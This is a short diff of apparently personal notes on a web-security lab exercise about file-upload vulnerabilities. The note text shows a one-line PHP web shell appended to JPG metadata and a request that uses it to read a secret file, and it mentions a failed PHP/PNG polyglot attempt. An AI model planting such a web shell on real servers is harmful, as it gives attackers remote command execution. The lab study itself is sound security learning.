@@ -96,7 +96,7 @@ after jpg image metadata add our payload which is
 <?php system($_GET['akash']); ?>
 ```
 
-after that  on the files/avatar/image.php?evil=cat+/home/carlos/secret 
+after that  on the files/avatar/image.php?akash=cat+/home/carlos/secret 
 this will lead us to the secreat key 
 
 `WE can also do this with the exiftool but i am getting issue like the polygot (php+png file) which is created but not able to upload that file getting error after uploading 403 forbidden.`
